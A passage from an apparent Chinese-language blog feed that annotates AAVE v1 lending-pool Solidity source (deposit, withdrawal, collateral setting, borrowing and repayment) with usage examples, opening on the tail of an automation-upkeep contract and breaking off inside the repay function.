performData)&#123;</span><br><span class="line">        upkeepNeeded = false;</span><br><span class="line">        for(uint256 i = 0; i &lt; SIZE; i++)&#123;</span><br><span class="line">            if(balances[i] &lt; INITIAL_BALANCE)&#123;</span><br><span class="line">                upkeepNeeded = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // 如果performUpkeep()需要checkUpkeep()执行输出的一些数据，则可以在performData操作</span><br><span class="line">        return (upkeepNeeded,&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function performUpkeep(bytes calldata) external &#123;</span><br><span class="line">        for(uint256 i = 0; i &lt; SIZE; i++)&#123;</span><br><span class="line">            if(balances[i] &lt; INITIAL_BALANCE)&#123;</span><br><span class="line">                balances[i] = INITIAL_BALANCE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 12.DeFi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.AAVE_v1_code</title>
      <link href="/2024/04/14/12.DeFi/05.AAVE_v1_code/"/>
      <url>/2024/04/14/12.DeFi/05.AAVE_v1_code/</url>
      
        <content type="html"><![CDATA[<h1 id="AAVE-v1-code"><a href="#AAVE-v1-code" class="headerlink" title="AAVE_v1_code"></a>AAVE_v1_code</h1><h2 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h2><p><img src="/2024/04/14/12.DeFi/05.AAVE_v1_code/image-20230806171007930.png" alt="image-20230806171007930"></p><h2 id="借贷池"><a href="#借贷池" class="headerlink" title="借贷池"></a>借贷池</h2><h3 id="存款"><a href="#存款" class="headerlink" title="存款"></a>存款</h3><ul><li>解释：我们存入标的资产，获得aToken，aToken可以1：1兑换标的资产，换句话说aToken是我们资产的凭证。</li><li>用法：如果想存入ETH，则_reserve是0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE，并且msg.value大于等于存入的ETH数量；如果是存入ERC20代币，则msg.value必须等于0</li><li><p>参数</p><ul><li><p>_reserve：标的资产(underlying token)的地址</p></li><li><p>_amount：存多少钱</p></li><li><p>_referralCode：推荐代码，一般填0，跟推广有关，已经过时了就懒得去了解。</p></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  function deposit(address _reserve, uint256 _amount, uint16 _referralCode)</span><br><span class="line">      external</span><br><span class="line">      payable</span><br><span class="line">      nonReentrant</span><br><span class="line">      onlyActiveReserve(_reserve)</span><br><span class="line">      onlyUnfreezedReserve(_reserve)</span><br><span class="line">      onlyAmountGreaterThanZero(_amount)</span><br><span class="line">  &#123;</span><br><span class="line">  // 获得标的资产的aToken地址</span><br><span class="line">      AToken aToken = AToken(core.getReserveATokenAddress(_reserve));</span><br><span class="line"></span><br><span class="line">// 看看是不是第一个存款</span><br><span class="line">      bool isFirstDeposit = aToken.balanceOf(msg.sender) == 0;</span><br><span class="line"></span><br><span class="line">// 更新存款信息</span><br><span class="line">      core.updateStateOnDeposit(_reserve, msg.sender, _amount, isFirstDeposit);</span><br><span class="line"></span><br><span class="line">// 给存款人挖 aToken。aToken可以1：1兑换标的资产</span><br><span class="line">      aToken.mintOnDeposit(msg.sender, _amount);</span><br><span class="line"></span><br><span class="line">      //transfer to the core contract</span><br><span class="line">      core.transferToReserve.value(msg.value)(_reserve, msg.sender, _amount);</span><br><span class="line"></span><br><span class="line">      //solium-disable-next-line</span><br><span class="line">      emit Deposit(_reserve, msg.sender, _amount, _referralCode, block.timestamp);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后进入<code>transferToReserve()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function transferToReserve(address _reserve, address payable _user, uint256 _amount)</span><br><span class="line">    external</span><br><span class="line">    payable</span><br><span class="line">    onlyLendingPool</span><br><span class="line">&#123;</span><br><span class="line">// 判断是不是要存入ETH，如果是存入ETH，</span><br><span class="line">// 则_reserve = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE</span><br><span class="line">    if (_reserve != EthAddressLib.ethAddress()) &#123;</span><br><span class="line">        require(msg.value == 0, &quot;User is sending ETH along with the ERC20 transfer.&quot;);</span><br><span class="line">        ERC20(_reserve).safeTransferFrom(_user, address(this), _amount);</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        require(msg.value &gt;= _amount, &quot;The amount and the value sent to deposit do not match&quot;);</span><br><span class="line"></span><br><span class="line">        if (msg.value &gt; _amount) &#123; // 多的钱发回给用户</span><br><span class="line">            //send back excess ETH</span><br><span class="line">            uint256 excessAmount = msg.value.sub(_amount);</span><br><span class="line">            //solium-disable-next-line</span><br><span class="line">            (bool result, ) = _user.call.value(excessAmount).gas(50000)(&quot;&quot;);</span><br><span class="line">            require(result, &quot;Transfer of ETH failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="取款"><a href="#取款" class="headerlink" title="取款"></a>取款</h3><ul><li>_reserve：取出的标的资产地址</li><li>_user：取款地址，可以是自己，也可以是别人</li><li>_amount：取款数额</li><li>_aTokenBalanceAfterRedeem：不知道有啥用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">  function redeemUnderlying(</span><br><span class="line">      address _reserve,</span><br><span class="line">      address payable _user,</span><br><span class="line">      uint256 _amount,</span><br><span class="line">      uint256 _aTokenBalanceAfterRedeem</span><br><span class="line">  )</span><br><span class="line">      external</span><br><span class="line">      nonReentrant</span><br><span class="line">      onlyOverlyingAToken(_reserve)</span><br><span class="line">      onlyActiveReserve(_reserve)</span><br><span class="line">      onlyAmountGreaterThanZero(_amount)</span><br><span class="line">  &#123;</span><br><span class="line">      uint256 currentAvailableLiquidity = core.getReserveAvailableLiquidity(_reserve);</span><br><span class="line">      require(</span><br><span class="line">          currentAvailableLiquidity &gt;= _amount,</span><br><span class="line">          &quot;There is not enough liquidity available to redeem&quot;</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">// 取款之后，更新AAVE池子信息</span><br><span class="line">      core.updateStateOnRedeem(_reserve, _user, _amount, _aTokenBalanceAfterRedeem == 0);</span><br><span class="line"></span><br><span class="line">// 取款</span><br><span class="line">      core.transferToUser(_reserve, _user, _amount);</span><br><span class="line"></span><br><span class="line">      //solium-disable-next-line</span><br><span class="line">      emit RedeemUnderlying(_reserve, _user, _amount, block.timestamp);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="设置抵押"><a href="#设置抵押" class="headerlink" title="设置抵押"></a>设置抵押</h3><p>用户可以将自己存入AAVE的资产作为抵押品，这是一个设置开关，为后续调用借款做准备</p><ul><li>_reserve：标的资产的地址</li><li>_useAsCollateral：是否设置作为抵押品</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function setUserUseReserveAsCollateral(address _reserve, bool _useAsCollateral)</span><br><span class="line">    external</span><br><span class="line">    nonReentrant</span><br><span class="line">    onlyActiveReserve(_reserve)</span><br><span class="line">    onlyUnfreezedReserve(_reserve)</span><br><span class="line">&#123;</span><br><span class="line">    uint256 underlyingBalance = core.getUserUnderlyingAssetBalance(_reserve, msg.sender);</span><br><span class="line"></span><br><span class="line">    require(underlyingBalance &gt; 0, &quot;User does not have any liquidity deposited&quot;);</span><br><span class="line"></span><br><span class="line">    require(</span><br><span class="line">        dataProvider.balanceDecreaseAllowed(_reserve, msg.sender, underlyingBalance),</span><br><span class="line">        &quot;User deposit is already being used as collateral&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    core.setUserUseReserveAsCollateral(_reserve, msg.sender, _useAsCollateral);</span><br><span class="line"></span><br><span class="line">    if (_useAsCollateral) &#123;</span><br><span class="line">        emit ReserveUsedAsCollateralEnabled(_reserve, msg.sender);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        emit ReserveUsedAsCollateralDisabled(_reserve, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进入core合约进行设置可以抵押</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function setUserUseReserveAsCollateral(address _reserve, address _user, bool _useAsCollateral)</span><br><span class="line">        public</span><br><span class="line">        onlyLendingPool</span><br><span class="line">    &#123;</span><br><span class="line">        CoreLibrary.UserReserveData storage user = usersReserveData[_user][_reserve];</span><br><span class="line">        user.useAsCollateral = _useAsCollateral;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 获取借贷池接口</span><br><span class="line">LendingPoolAddressesProvider provider = LendingPoolAddressesProvider(address(0x24a42fD28C976A61Df5D00D0599C34c4f90748c8)); </span><br><span class="line">LendingPool lendingPool = LendingPool(provider.getLendingPool());</span><br><span class="line"></span><br><span class="line">/// 标的资产为DAI</span><br><span class="line">address daiAddress = address(0x6B175474E89094C44Da98b954EedeAC495271d0F); // mainnet DAI</span><br><span class="line">bool useAsCollateral = true;</span><br><span class="line"></span><br><span class="line">//设置开关</span><br><span class="line">lendingPool.setUserUseReserveAsCollateral(daiAddress, useAsCollateral);</span><br></pre></td></tr></table></figure><h3 id="借款"><a href="#借款" class="headerlink" title="借款"></a>借款</h3><p>超额抵押借款，调用这个方法之前要保证你已经存入了足够数量的抵押品</p><ul><li>_reserve：要借款的标的资产地址</li><li>_amount：借入金额</li><li>_interestRateMode：利率模型，1代表稳定利率，2代表可变利率</li><li>_referralCode：推荐代码，一般填0，跟推广有关，已经过时了就懒得去了解。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">function borrow(</span><br><span class="line">    address _reserve,</span><br><span class="line">    uint256 _amount,</span><br><span class="line">    uint256 _interestRateMode,</span><br><span class="line">    uint16 _referralCode</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    nonReentrant</span><br><span class="line">    onlyActiveReserve(_reserve)</span><br><span class="line">    onlyUnfreezedReserve(_reserve)</span><br><span class="line">    onlyAmountGreaterThanZero(_amount)</span><br><span class="line">&#123;</span><br><span class="line">    // 用一个结构体来记录信息，防止栈过深，怕超过16个</span><br><span class="line">    BorrowLocalVars memory vars;</span><br><span class="line"></span><br><span class="line">    // 合约中的标的资产要设置为可借出，否则此标的资产无法借出</span><br><span class="line">    require(core.isReserveBorrowingEnabled(_reserve), &quot;Reserve is not enabled for borrowing&quot;);</span><br><span class="line">    // 只允许1和2两种利率模型：稳定利率，可变利率</span><br><span class="line">    require(</span><br><span class="line">        uint256(CoreLibrary.InterestRateMode.VARIABLE) == _interestRateMode ||</span><br><span class="line">            uint256(CoreLibrary.InterestRateMode.STABLE) == _interestRateMode,</span><br><span class="line">        &quot;Invalid interest rate mode selected&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 设置利率模型</span><br><span class="line">    vars.rateMode = CoreLibrary.InterestRateMode(_interestRateMode);</span><br><span class="line"></span><br><span class="line">    // 查看此标的资产可借出的数量</span><br><span class="line">    vars.availableLiquidity = core.getReserveAvailableLiquidity(_reserve);</span><br><span class="line"></span><br><span class="line">    require(</span><br><span class="line">        vars.availableLiquidity &gt;= _amount,</span><br><span class="line">        &quot;There is not enough liquidity available in the reserve&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    (</span><br><span class="line">        ,</span><br><span class="line">        vars.userCollateralBalanceETH, // 总质押物品的总价值：用ETH计价</span><br><span class="line">        vars.userBorrowBalanceETH, // 目前已经借了多少物品：用ETH计价</span><br><span class="line">        vars.userTotalFeesETH, // 总手续费ETH</span><br><span class="line">        vars.currentLtv,</span><br><span class="line">        vars.currentLiquidationThreshold, // 当前流动性阈值</span><br><span class="line">        ,</span><br><span class="line">        vars.healthFactorBelowThreshold // 是否达到质押的健康因子的阈值</span><br><span class="line">    ) = dataProvider.calculateUserGlobalData(msg.sender);</span><br><span class="line"></span><br><span class="line">    // 需要用户质押过抵押品</span><br><span class="line">    require(vars.userCollateralBalanceETH &gt; 0, &quot;The collateral balance is 0&quot;);</span><br><span class="line"></span><br><span class="line">    // 如果健康因子达到了清算阈值，则可被清算，不可以再借款</span><br><span class="line">    require(</span><br><span class="line">        !vars.healthFactorBelowThreshold,</span><br><span class="line">        &quot;The borrower can already be liquidated so he cannot borrow more&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 计算手续费：借款数量 * 比例</span><br><span class="line">    vars.borrowFee = feeProvider.calculateLoanOriginationFee(msg.sender, _amount);</span><br><span class="line"></span><br><span class="line">    // 借款数目不能太小，否则手续费四舍五入变成0 revert</span><br><span class="line">    require(vars.borrowFee &gt; 0, &quot;The amount to borrow is too small&quot;);</span><br><span class="line"></span><br><span class="line">    // 根据借款的信息，计算用户需要质押多少价值：用ETH计价</span><br><span class="line">    vars.amountOfCollateralNeededETH = dataProvider.calculateCollateralNeededInETH(</span><br><span class="line">        _reserve,</span><br><span class="line">        _amount,</span><br><span class="line">        vars.borrowFee,</span><br><span class="line">        vars.userBorrowBalanceETH,</span><br><span class="line">        vars.userTotalFeesETH,</span><br><span class="line">        vars.currentLtv</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 超额抵押的检验关键：用户总质押的物品的价值必须大于等于用户将要借出的物品的价值</span><br><span class="line">    require(</span><br><span class="line">        vars.amountOfCollateralNeededETH &lt;= vars.userCollateralBalanceETH,</span><br><span class="line">        &quot;There is not enough collateral to cover a new borrow&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 如果是稳定利率模式</span><br><span class="line">    if (vars.rateMode == CoreLibrary.InterestRateMode.STABLE) &#123;</span><br><span class="line">        // AAVE检测该用户是否被允许以稳定利率模式借款</span><br><span class="line">        require(</span><br><span class="line">            core.isUserAllowedToBorrowAtStable(_reserve, msg.sender, _amount),</span><br><span class="line">            &quot;User cannot borrow the selected amount with a stable rate&quot;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // 计算用户在稳定利率模式下能够借贷的最大百分比</span><br><span class="line">        // 然后计算可以借款的数额</span><br><span class="line">        uint256 maxLoanPercent = parametersProvider.getMaxStableRateBorrowSizePercent();</span><br><span class="line">        uint256 maxLoanSizeStable = vars.availableLiquidity.mul(maxLoanPercent).div(100);</span><br><span class="line"></span><br><span class="line">        // 用户借款的数额要小于等于最大可借出的数额</span><br><span class="line">        require(</span><br><span class="line">            _amount &lt;= maxLoanSizeStable,</span><br><span class="line">            &quot;User is trying to borrow too much liquidity at a stable rate&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //  可变利率没有做操作，但是系统前面的检测已经保证了质押的金额要大于等于借出的数额，系统已经安全了</span><br><span class="line"></span><br><span class="line">    //上面的所有检查都通过，AAVE设置新的借款信息</span><br><span class="line">    (vars.finalUserBorrowRate, vars.borrowBalanceIncrease) = core.updateStateOnBorrow(</span><br><span class="line">        _reserve,</span><br><span class="line">        msg.sender,</span><br><span class="line">        _amount,</span><br><span class="line">        vars.borrowFee,</span><br><span class="line">        vars.rateMode</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 上面的所有检查都通过，AAVE才借款</span><br><span class="line">    core.transferToUser(_reserve, msg.sender, _amount);</span><br><span class="line"></span><br><span class="line">    emit Borrow(</span><br><span class="line">        _reserve,</span><br><span class="line">        msg.sender,</span><br><span class="line">        _amount,</span><br><span class="line">        _interestRateMode,</span><br><span class="line">        vars.finalUserBorrowRate,</span><br><span class="line">        vars.borrowFee,</span><br><span class="line">        vars.borrowBalanceIncrease,</span><br><span class="line">        _referralCode,</span><br><span class="line">        //solium-disable-next-line</span><br><span class="line">        block.timestamp</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 下面的操作之前，需要先质押ETH或者代币到AAVE，并且设置抵押</span><br><span class="line"></span><br><span class="line">// 获取合约接口</span><br><span class="line">LendingPoolAddressesProvider provider = LendingPoolAddressesProvider(address(0x24a42fD28C976A61Df5D00D0599C34c4f90748c8)); </span><br><span class="line">LendingPool lendingPool = LendingPool(provider.getLendingPool());</span><br><span class="line"></span><br><span class="line">// 我们借DAI</span><br><span class="line">address daiAddress = address(0x6B175474E89094C44Da98b954EedeAC495271d0F); </span><br><span class="line">uint256 amount = 1000 * 1e18;</span><br><span class="line"></span><br><span class="line">// 可变利率模式</span><br><span class="line">uint256 variableRate = 2;</span><br><span class="line">uint256 referral = 0;</span><br><span class="line"></span><br><span class="line">// 借款</span><br><span class="line">lendingPool.borrow(daiAddress, amount, variableRate, referral);</span><br></pre></td></tr></table></figure><h3 id="还款"><a href="#还款" class="headerlink" title="还款"></a>还款</h3><ul><li>_reserve：标的资产，如果是还ETH，则填写0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE</li><li>_amount：还款金额。如果是自己还款，可以用-1表示还所有钱；帮别人还不能用-1，建议发送略高于借款金额的钱</li><li>_onBehalfOf：自己还则填写自己的地址，帮别人还则填写别人的地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">function repay(address _reserve, uint256 _amount, address payable _onBehalfOf)</span><br><span class="line">    external</span><br><span class="line">    payable</span><br><span class="line">    nonReentrant</span><br><span class="line">    onlyActiveReserve(_reserve)</span><br><span class="line">    onlyAmountGreaterThanZero(_amount)</span><br><span class="line">&#123;</span><br><span class="line">    // 防止栈过深</span><br><span class="line">    RepayLocalVars memory vars;</span><br><span class="line"></span><br><span class="line">    // 查看用户借款信息，_onBehalfOf可以是自己，也可以是别人，如果是别人则代表帮别人还款</span><br><span class="line">    (</span><br><span class="line">        vars.principalBorrowBalance,</span><br><span class="line">        vars.compoundedBorrowBalance,</span><br><span class="line">        vars.borrowBalanceIncrease</span><br><span class="line">    ) = core.getUserBorrowBalances(_reserve, _onBehalfOf);</span><br><span class="line"></span><br><span class="line">    // 手续费</span><br><span class="line">    vars.originationFee = core.getUserOriginationFee(_reserve, _onBehalfOf);</span><br><span class="line">    // 借的是不是ETH</span><br><span class="line">    vars.isETH = EthAddressLib.ethAddress() == _reserve;</span><br><span class="line"></span><br><span class="line">    // 借款总金额要大于0</span><br><span class="line">    require(vars.compoundedBorrowBalance &gt; 0, &quot;The user does not have any borrow pending&quot;);</span><br><span class="line"></span><br><span class="line">    // 如果是帮别人还全部，则不能填写-1，应该写具体金额</span><br><span class="line">    // 如果是自己还款，可以填写-1</span><br><span class="line">    require(</span><br><span class="line">        _amount != UINT_MAX_VALUE || msg.sender == _onBehalfOf,</span><br><span class="line">        &quot;To repay on behalf of an user an explicit amount to repay is needed.&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 手续费</span><br><span class="line">    vars.paybackAmount = vars.compoundedBorrowBalance.add(vars.originationFee);</span><br><span class="line"></span><br><span class="line">    // 部分还款的时候不需要还手续费</span><br><span class="line">    if (_amount != UINT_MAX_VALUE &amp;&amp; _amount &lt; vars.paybackAmount) &#123;</span><br><span class="line">        vars.paybackAmount = _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查看是不是还ETH：如果还ETH，则输入msg.value，如果是还token，则继续往下</span><br><span class="line">    require(</span><br><span class="line">        !vars.isETH || msg.value &gt;= vars.paybackAmount,</span><br><span class="line">        &quot;Invalid msg.value sent for the repayment&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 如果偿还的金额比手续费还少，还完这点钱然后就退出</span><br><span class="line">    if (vars.paybackAmount &lt;= vars.originationFee) &#123;</span><br><span class="line">        // 更新还款信息</span><br><span class="line">        core.updateStateOnRepay(</span><br><span class="line">            _reserve,</span><br><span class="line">            _onBehalfOf,</span><br><span class="line">            0,</span><br><span class="line">            vars.paybackAmount,</span><br><span class="line">            vars.borrowBalanceIncrease,</span><br><span class="line">            false</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // 偿还金额</span><br><span class="line">        core.transferToFeeCollectionAddress.value(vars.isETH ? vars.paybackAmount : 0)(</span><br><span class="line">            _reserve,</span><br><span class="line">            _onBehalfOf,</span><br><span class="line">            vars.paybackAmount,</span><br><span class="line">            addressesProvider.getTokenDistributor()</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit Repay(</span><br><span class="line">            _reserve,</span><br><span class="line">            _onBehalfOf,</span><br><span class="line">            msg.sender,</span><br><span class="line">            0,</span><br><span class="line">            vars.paybackAmount,</span><br><span class="line">            vars.borrowBalanceIncrease,</span><br><span class="line">            //solium-disable-next-line</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 减去手续费</span><br><span class="line">    vars.paybackAmountMinusFees = vars.paybackAmount.sub(vars.originationFee);</span><br><span class="line"></span><br><span class="line">    // 